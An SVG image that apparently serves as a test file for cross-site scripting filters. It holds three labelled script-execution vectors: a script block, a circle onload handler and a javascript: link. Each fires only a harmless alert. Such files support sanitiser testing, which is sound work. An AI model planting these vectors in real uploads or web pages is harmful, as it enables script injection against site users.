<svg width="300" height="200" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
    <rect width="100%" height="100%" fill="#ffebee" />
    
    <!-- Active script execution inside SVG -->
    <script type="text/javascript">
        <![CDATA[
            alert('SVG Script Execution Vector Triggered');
        ]]>
    </script>

    <!-- Inline event handler in SVG elements -->
    <circle cx="150" cy="100" r="40" fill="#e53935" onload="alert('SVG Circle Onload XSS')" />

    <!-- Malicious javascript link in SVG xlink:href -->
    <a xlink:href="javascript:alert('SVG XLink Javascript URI')">
        <text x="150" y="170" text-anchor="middle" fill="#c62828" font-size="14">Click Here</text>
    </a>
</svg>
